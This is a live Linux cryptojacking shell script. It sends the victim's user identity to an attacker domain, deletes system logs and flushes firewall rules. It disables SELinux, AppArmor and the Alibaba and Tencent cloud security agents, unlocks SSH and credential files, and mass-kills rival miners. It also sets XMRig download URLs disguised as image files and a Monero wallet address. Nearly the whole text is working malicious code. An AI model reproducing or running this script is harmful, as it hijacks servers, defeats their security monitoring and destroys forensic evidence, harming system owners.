#!/bin/bash

us=$(id)
curl "http://oracle.zzhreceive.top/b2f628/idcheck/$us" >>/dev/null
ulimit -n 65535
export MOHOME=/usr/share
if [ -f "$MOHOME/[crypto].log" ]
then
    echo "process possible running"
    current=$(date +%s)
    last_modified=$(stat -c "%Y" $MOHOME/[crypto].log)
   if [ $(($current-$last_modified)) -gt 600 ]; then
        echo "no miner process running";
    else
    echo "miner process running"
    exit 1
   fi
else 
    echo "miner process not running"
fi
export MOHOME=/var/tmp/.system
mkdir $MOHOME -p
if [ -f "$MOHOME/[ext4].log" ]
then
    echo "process possible running"
    current=$(date +%s)
    last_modified=$(stat -c "%Y" $MOHOME/[ext4].log)
   if [ $(($current-$last_modified)) -gt 600 ]; then
        echo "no miner process running";
    else
    echo "miner process running"
    exit 1
   fi
else 
    echo "miner process not running"
fi
rm -rf /var/log/syslog
chattr -iua /tmp/
chattr -iua /var/tmp/
ufw disable
iptables -F
sudo sysctl kernel.nmi_watchdog=0
sysctl kernel.nmi_watchdog=0
echo '0' >/proc/sys/kernel/nmi_watchdog
echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf
chattr -iae /root/.ssh/
chattr -iae /root/.ssh/authorized_keys
rm -rf /tmp/addres*
rm -rf /tmp/walle*
rm -rf /tmp/keys
if ps aux | grep -i '[a]liyun'; then
  AEGIS_INSTALL_DIR="/usr/local/aegis"
#check linux Gentoo os 
var=`lsb_release -a | grep Gentoo`
if [ -z "${var}" ]; then 
	var=`cat /etc/issue | grep Gentoo`
fi
checkCoreos=`cat /etc/os-release 2>/dev/null | grep coreos`
if [ -d "/etc/runlevels/default" -a -n "${var}" ]; then
	LINUX_RELEASE="GENTOO"
elif [ -f "/etc/os-release" -a -n "${checkCoreos}" ]; then
	LINUX_RELEASE="COREOS"
	AEGIS_INSTALL_DIR="/opt/aegis"
else 
	LINUX_RELEASE="OTHER"
fi		

stop_aegis_pkill(){
    pkill -9 AliYunDun >/dev/null 2>&1
    pkill -9 AliHids >/dev/null 2>&1
    pkill -9 AliHips >/dev/null 2>&1
    pkill -9 AliNet >/dev/null 2>&1
    pkill -9 AliSecGuard >/dev/null 2>&1
    pkill -9 AliYunDunUpdate >/dev/null 2>&1

    
    /usr/local/aegis/AliNet/AliNet --stopdriver
    /usr/local/aegis/alihips/AliHips --stopdriver
    /usr/local/aegis/AliSecGuard/AliSecGuard --stopdriver
    printf "%-40s %40s\n" "Stopping aegis" "[  OK  ]"
}

# can not remove all aegis folder, because there is backup file in globalcfg
remove_aegis(){
if [ -d "${AEGIS_INSTALL_DIR}" ];then
    umount ${AEGIS_INSTALL_DIR}/aegis_debug
    rm -rf ${AEGIS_INSTALL_DIR}/aegis_client
    rm -rf ${AEGIS_INSTALL_DIR}/aegis_update
	rm -rf ${AEGIS_INSTALL_DIR}/alihids
    rm -rf ${AEGIS_INSTALL_DIR}/globalcfg/domaincfg.ini
fi
}

uninstall_service() {
   
   if [ -f "/etc/init.d/aegis" ]; then
		/etc/init.d/aegis stop  >/dev/null 2>&1
		rm -f /etc/init.d/aegis 
   fi

	if [ $LINUX_RELEASE = "GENTOO" ]; then
		rc-update del aegis default 2>/dev/null
		if [ -f "/etc/runlevels/default/aegis" ]; then
			rm -f "/etc/runlevels/default/aegis" >/dev/null 2>&1;
		fi
    elif [ -f /etc/init.d/aegis ]; then
         /etc/init.d/aegis  uninstall
	    for ((var=2; var<=5; var++)) do
			if [ -d "/etc/rc${var}.d/" ];then
				 rm -f "/etc/rc${var}.d/S80aegis"
		    elif [ -d "/etc/rc.d/rc${var}.d" ];then
				rm -f "/etc/rc.d/rc${var}.d/S80aegis"
			fi
		done
    fi

}

stop_aegis_pkill
uninstall_service
remove_aegis
umount ${AEGIS_INSTALL_DIR}/aegis_debug
printf "%-40s %40s\n" "Uninstalling aegis"  "[  OK  ]"

elif ps aux | grep -i '[y]unjing'; then
  /usr/local/qcloud/stargate/admin/uninstall.sh
  /usr/local/qcloud/YunJing/uninst.sh
  /usr/local/qcloud/monitor/barad/admin/uninstall.sh
fi
if [ -f /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh ]; then
  /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh stop && /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh remove && rm -rf /usr/local/cloudmonitor	
else
  export ARCHD=amd64
  if [ -f /usr/local/cloudmonitor/CmsGoAgent.linux-${ARCHD} ]; then
    /usr/local/cloudmonitor/CmsGoAgent.linux-${ARCHD} stop && /usr/local/cloudmonitor/CmsGoAgent.linux-${ARCHD} uninstall && rm -rf /usr/local/cloudmonitor	
  else
    echo "ali cloud monitor not running"
  fi
fi
setenforce 0
echo SELINUX=disabled >/etc/selinux/config
service apparmor stop
systemctl disable apparmor
systemctl stop aliyun
systemctl disable aliyun.service


MOxmrigMOD=http://112.253.11.38/mid.jpg
MOxmrigSTOCK=http://112.253.11.38/mid.jpg
miner_url=https://github.com/xmrig/xmrig/releases/download/v6.10.0/xmrig-6.10.0-linux-static-x64.tar.gz
miner_url_backup=http://oracle.zzhreceive.top/b2f628/father.jpg
config_url=http://oracle.zzhreceive.top/b2f628/cf.jpg
config_url_backup=http://oracle.zzhreceive.top/b2f628/cf.jpg
WALLET=43Xbgtym2GZWBk87XiYbCpTKGPBTxYZZWi44SWrkqqvzPZV6Pfmjv3UHR6FDwvPgePJyv9N5PepeajfmKp1X71EW7jx4Tpz.zookp1
VERSION=2.9


function FixTheSystem(){
echo "begin FixTheSystem"
tntrecht -i /bin/chmod || chattr -i /bin/chmod
setfacl -m u::x /bin/chmod
tntrecht -i /bin/chattr || chattr -i /bin/chattr
chmod +x /bin/chattr || setfacl -m u::x /bin/chattr

SYSFILEARRAY=(/usr/bin/apt  /usr/bin/apt-get /bin/yum  /bin/kill /usr/lib/klibc/bin/kill /usr/bin/pkill /bin/pkill /sbin/shutdown /sbin/reboot /sbin/poweroff /sbin/telinit)
for SYSFILEBIN in ${SYSFILEARRAY[@]}; do
tntrecht -i $SYSFILEBIN 
chattr -i $SYSFILEBIN 
setfacl -m u::x /bin/chmod 
setfacl -m u::x $SYSFILEBIN
chmod +x $SYSFILEBIN 
chattr +i $SYSFILEBIN 
tntrecht +i $SYSFILEBIN 
done


SYSTEMFILEARRAY=("/root/.ssh/" "/home/*/.ssh/" "/etc/passwd" "/etc/shadow" "/etc/sudoers" "/etc/ssh/" "/etc/ssh/sshd_config")
for SYSTEMFILE in ${SYSTEMFILEARRAY[@]}; do
tntrecht -iR $SYSTEMFILE  2>/dev/null 1>/dev/null
chattr -iR $SYSTEMFILE  2>/dev/null 1>/dev/null
done

setfacl -m u::x /bin/chmod

}


kill_miner_proc()
{
netstat -anp | grep 185.71.65.238 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs -I % kill -9 %
netstat -anp | grep 140.82.52.87 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs -I % kill -9 %
netstat -anp | grep :443 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :23 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :443 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :143 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :2222 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :3333 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :3389 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :5555 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :6666 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :6665 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :6667 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :7777 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :8444 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :3347 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
ps aux | grep -v grep | grep ':3333' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep ':5555' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'kworker -c\' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'log_' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'systemten' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'netns' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'voltuned' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'darwin' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/dl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/ddg' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/pprt' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/ppol' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/65ccE*' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/jmx*' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/2Ne80*' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'IOFoqIgyC0zmf2UR' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '45.76.122.92' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '51.38.191.178' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '51.15.56.161' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '86s.jpg' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'aGTSGJJp' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'I0r8Jyyt' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'AgdgACUD' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'uiZvwxG8' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'hahwNEdB' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'BtwXn5qH' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '3XEzey2T' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 't2tKrCSZ' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'svc' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'HD7fcBgg' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'zXcDajSs' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '3lmigMo' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'AkMK4A2' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'AJ2AkKe' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'HiPxCJRS' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'http_0xCC030' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'http_0xCC031' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'http_0xCC032' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'http_0xCC033' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "C4iLM4L" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'aziplcr72qjhzvin' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | awk '{ if(substr($11,1,2)=="./" && substr($12,1,2)=="./") print $2 }' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/boot/vmlinuz' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "i4b503a52cc5" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "dgqtrcst23rtdi3ldqk322j2" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "2g0uv7npuhrlatd" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "nqscheduler" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "rkebbwgqpl4npmm" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep -v aux | grep "]" | awk '$3>10.0{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "2fhtu70teuhtoh78jc5s" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "0kwti6ut420t" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "44ct7udt0patws3agkdfqnjm" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep -v "/" | grep -v "-" | grep -v "_" | awk 'length($11)>19{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "\[^" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "rsync" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "watchd0g" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | egrep 'wnTKYg|2t3ik|qW3xT.2|ddg' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "158.69.133.18:8220" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "/tmp/java" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'gitee.com' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/java' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '104.248.4.162' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '89.35.39.78' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/dev/shm/z3.sh' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'kthrotlds' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'ksoftirqds' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'netdns' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'watchdogs' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'kdevtmpfsi' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'kinsing' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'redis2' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep -v aux | grep " ps" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "sync_supers" | cut -c 9-15 | xargs -I % kill -9 %
ps aux | grep -v grep | grep "cpuset" | cut -c 9-15 | xargs -I % kill -9 %
ps aux | grep -v grep | grep -v aux | grep "x]" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep -v aux | grep "sh] <" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep -v aux | grep " \[]" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/l.sh' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/zmcat' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'hahwNEdB' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'CnzFVPLF' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'CvKzzZLs' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'aziplcr72qjhzvin' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/udevd' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'KCBjdXJsIC1vIC0gaHR0cDovLzg5LjIyMS41Mi4xMjIvcy5zaCApIHwgYmFzaCA' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'Y3VybCAtcyBodHRwOi8vMTA3LjE3NC40Ny4xNTYvbXIuc2ggfCBiYXNoIC1zaAo' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'sustse' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'sustse3' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'mr.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'mr.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '2mr.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '2mr.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'cr5.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'cr5.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'logo9.jpg' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'logo9.jpg' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'j2.conf' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'luk-cpu' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'luk-cpu' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'ficov' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'ficov' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'he.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'he.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'miner.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'miner.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'nullcrew' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'nullcrew' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '107.174.47.156' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '83.220.169.247' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '51.38.203.146' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '144.217.45.45' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '107.174.47.181' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '176.31.6.16' | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "mine.moneropool.com" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "pool.t00ls.ru" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "zhuabcn@yahoo.com" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "monerohash.com" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "/tmp/a7b104c270" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "stratum.f2pool.com:8888" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "xmrpool.eu" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "kieuanilam.me" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep xiaoyao | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep xiaoxue | awk '{print $2}' | xargs -I % kill -9 %
netstat -antp | grep '46.243.253.15' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
netstat -antp | grep '176.31.6.16' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
pgrep -f L2Jpbi9iYXN | xargs -I % kill -9 %
pgrep -f xzpauectgr | xargs -I % kill -9 %
pgrep -f slxfbkmxtd | xargs -I % kill -9 %
pgrep -f mixtape | xargs -I % kill -9 %
pgrep -f addnj | xargs -I % kill -9 %
pgrep -f 200.68.17.196 | xargs -I % kill -9 %
pgrep -f IyEvYmluL3NoCgpzUG | xargs -I % kill -9 %
pgrep -f KHdnZXQgLXFPLSBodHRw | xargs -I % kill -9 %
pgrep -f FEQ3eSp8omko5nx9e97hQ39NS3NMo6rxVQS3 | xargs -I % kill -9 %
pgrep -f Y3VybCAxOTEuMTAxLjE4MC43Ni9saW4udHh0IHxzaAo | xargs -I % kill -9 %
pgrep -f mwyumwdbpq.conf | xargs -I % kill -9 %
pgrep -f honvbsasbf.conf | xargs -I % kill -9 %
pgrep -f mqdsflm.cf | xargs -I % kill -9 %
pgrep -f lower.sh | xargs -I % kill -9 %
pgrep -f ./ppp | xargs -I % kill -9 %
pgrep -f ./seervceaess | xargs -I % kill -9 %
pgrep -f ./servceaess | xargs -I % kill -9 %
pgrep -f ./servceas | xargs -I % kill -9 %
pgrep -f ./servcesa | xargs -I % kill -9 %
pgrep -f ./vsp | xargs -I % kill -9 %
pgrep -f ./jvs | xargs -I % kill -9 %
pgrep -f ./pvv | xargs -I % kill -9 %
pgrep -f ./vpp | xargs -I % kill -9 %
pgrep -f ./pces | xargs -I % kill -9 %
pgrep -f ./rspce | xargs -I % kill -9 %
pgrep -f ./haveged | xargs -I % kill -9 %
pgrep -f ./jiba | xargs -I % kill -9 %
pgrep -f ./watchbog | xargs -I % kill -9 %
pgrep -f ./A7mA5gb | xargs -I % kill -9 %
pgrep -f kacpi_svc | xargs -I % kill -9 %
pgrep -f kswap_svc | xargs -I % kill -9 %
pgrep -f kauditd_svc | xargs -I % kill -9 %
pgrep -f kpsmoused_svc | xargs -I % kill -9 %
pgrep -f kseriod_svc | xargs -I % kill -9 %
pgrep -f kthreadd_svc | xargs -I % kill -9 %
pgrep -f ksoftirqd_svc | xargs -I % kill -9 %
pgrep -f kintegrityd_svc | xargs -I % kill -9 %
pgrep -f jawa | xargs -I % kill -9 %
pgrep -f oracle.jpg | xargs -I % kill -9 %
pgrep -f 45cToD1FzkjAxHRBhYKKLg5utMGEN | xargs -I % kill -9 %
pgrep -f 188.209.49.54 | xargs -I % kill -9 %
pgrep -f 181.214.87.241 | xargs -I % kill -9 %
pgrep -f etnkFgkKMumdqhrqxZ6729U7bY8pzRjYzGbXa5sDQ | xargs -I % kill -9 %
pgrep -f 47TdedDgSXjZtJguKmYqha4sSrTvoPXnrYQEq2Lbj | xargs -I % kill -9 %
pgrep -f etnkP9UjR55j9TKyiiXWiRELxTS51FjU9e1UapXyK | xargs -I % kill -9 %
pgrep -f servim | xargs -I % kill -9 %
pgrep -f kblockd_svc | xargs -I % kill -9 %
pgrep -f native_svc | xargs -I % kill -9 %
pgrep -f ynn | xargs -I % kill -9 %
pgrep -f 65ccEJ7 | xargs -I % kill -9 %
pgrep -f jmxx | xargs -I % kill -9 %
pgrep -f 2Ne80nA | xargs -I % kill -9 %
pgrep -f sysstats | xargs -I % kill -9 %
pgrep -f systemxlv | xargs -I % kill -9 %
pgrep -f watchbog | xargs -I % kill -9 %
pgrep -f OIcJi1m | xargs -I % kill -9 %
pkill -f biosetjenkins
pkill -f Loopback
pkill -f apaceha
pkill -f mixnerdx
pkill -f performedl
pkill -f JnKihGjn
pkill -f irqba2anc1
pkill -f irqba5xnc1
pkill -f irqbnc1
pkill -f ir29xc1
pkill -f conns
pkill -f irqbalance
pkill -f XJnRj
pkill -f mgwsl
pkill -f pythno
pkill -f jweri
pkill -f lx26
pkill -f NXLAi
pkill -f BI5zj
pkill -f askdljlqw
pkill -f minerd
pkill -f minergate
pkill -f Guard.sh
pkill -f ysaydh
pkill -f bonns
pkill -f donns
pkill -f kxjd
pkill -f Duck.sh
pkill -f bonn.sh
pkill -f conn.sh
pkill -f kworker34
pkill -f kw.sh
pkill -f pro.sh
pkill -f polkitd
pkill -f acpid
pkill -f icb5o
pkill -f nopxi
pkill -f irqbalanc1
pkill -f minerd
pkill -f i586
pkill -f gddr
pkill -f mstxmr
pkill -f ddg.2011
pkill -f wnTKYg
pkill -f deamon
pkill -f disk_genius
pkill -f sourplum
pkill -f polkitd
pkill -f nanoWatch
pkill -f zigw
pkill -f devtool
pkill -f devtools
pkill -f systemctI
pkill -f watchbog
pkill -f sustes
pkill -f xmrig
pkill -f xmrig-cpu
pkill -f 121.42.151.137
pkill -f init12.cfg
pkill -f nginxk
pkill -f tmp/wc.conf
pkill -f xmrig-notls
pkill -f xmr-stak
pkill -f suppoie
pkill -f zer0day.ru
pkill -f dbus-daemon--system
pkill -f nullcrew
pkill -f systemctI
pkill -f kworkerds
pkill -f init10.cfg
pkill -f /wl.conf
pkill -f crond64
pkill -f sustse
pkill -f vmlinuz
pkill -f exin
pkill -f apachiii
pkill -f svcworkmanager
pkill -f xr
pkill -f trace
pkill -f svcupdate
pkill -f networkmanager
pkill -f phpupdate
rm -rf /usr/bin/config.json
rm -rf /usr/bin/exin
rm -rf /tmp/wc.conf
rm -rf /tmp/log_rot
rm -rf /tmp/apachiii
rm -rf /tmp/sustse
rm -rf /tmp/php
rm -rf /tmp/p2.conf
rm -rf /tmp/pprt
rm -rf /tmp/ppol
rm -rf /tmp/javax/config.sh
rm -rf /tmp/javax/sshd2
rm -rf /tmp/.profile
rm -rf /tmp/1.so
rm -rf /tmp/kworkerds
rm -rf /tmp/kworkerds3
rm -rf /tmp/kworkerdssx
rm -rf /tmp/xd.json
rm -rf /tmp/syslogd
rm -rf /tmp/syslogdb
rm -rf /tmp/65ccEJ7
rm -rf /tmp/jmxx
rm -rf /tmp/2Ne80nA
rm -rf /tmp/dl
rm -rf /tmp/ddg
rm -rf /tmp/systemxlv
rm -rf /tmp/systemctI
rm -rf /tmp/.abc
rm -rf /tmp/osw.hb
rm -rf /tmp/.tmpleve
rm -rf /tmp/.tmpnewzz
rm -rf /tmp/.java
rm -rf /tmp/.omed
rm -rf /tmp/.tmpc
rm -rf /tmp/.tmpleve
rm -rf /tmp/.tmpnewzz
rm -rf /tmp/gates.lod
rm -rf /tmp/conf.n
rm -rf /tmp/devtool
rm -rf /tmp/devtools
rm -rf /tmp/fs
rm -rf /tmp/.rod
rm -rf /tmp/.rod.tgz
rm -rf /tmp/.rod.tgz.1
rm -rf /tmp/.rod.tgz.2
rm -rf /tmp/.mer
rm -rf /tmp/.mer.tgz
rm -rf /tmp/.mer.tgz.1
rm -rf /tmp/.hod
rm -rf /tmp/.hod.tgz
rm -rf /tmp/.hod.tgz.1
rm -rf /tmp/84Onmce
rm -rf /tmp/C4iLM4L
rm -rf /tmp/lilpip
rm -rf /tmp/3lmigMo
rm -rf /tmp/am8jmBP
rm -rf /tmp/tmp.txt
rm -rf /tmp/baby
rm -rf /tmp/.lib
rm -rf /tmp/systemd
rm -rf /tmp/lib.tar.gz
rm -rf /tmp/baby
rm -rf /tmp/java
rm -rf /tmp/j2.conf
rm -rf /tmp/.mynews1234
rm -rf /tmp/a3e12d
rm -rf /tmp/.pt
rm -rf /tmp/.pt.tgz
rm -rf /tmp/.pt.tgz.1
rm -rf /tmp/go
rm -rf /tmp/java
rm -rf /tmp/j2.conf
rm -rf /tmp/.tmpnewasss
rm -rf /tmp/java
rm -rf /tmp/go.sh
rm -rf /tmp/go2.sh
rm -rf /tmp/khugepageds
rm -rf /tmp/.censusqqqqqqqqq
rm -rf /tmp/.kerberods
rm -rf /tmp/kerberods
rm -rf /tmp/seasame
rm -rf /tmp/touch
rm -rf /tmp/.p
rm -rf /tmp/runtime2.sh
rm -rf /tmp/runtime.sh
rm -rf /dev/shm/z3.sh
rm -rf /dev/shm/z2.sh
rm -rf /dev/shm/.scr
rm -rf /dev/shm/.kerberods
rm -f /etc/ld.so.preload
rm -f /usr/local/lib/libioset.so
chattr -i /etc/ld.so.preload
rm -f /etc/ld.so.preload
rm -f /usr/local/lib/libioset.so
rm -rf /tmp/watchdogs
rm -rf /etc/cron.d/tomcat
rm -rf /etc/rc.d/init.d/watchdogs
rm -rf /usr/sbin/watchdogs
rm -f /tmp/kthrotlds
rm -f /etc/rc.d/init.d/kthrotlds
rm -rf /tmp/.sysbabyuuuuu12
rm -rf /tmp/logo9.jpg
rm -rf /tmp/miner.sh
rm -rf /tmp/nullcrew
rm -rf /tmp/proc
rm -rf /tmp/2.sh
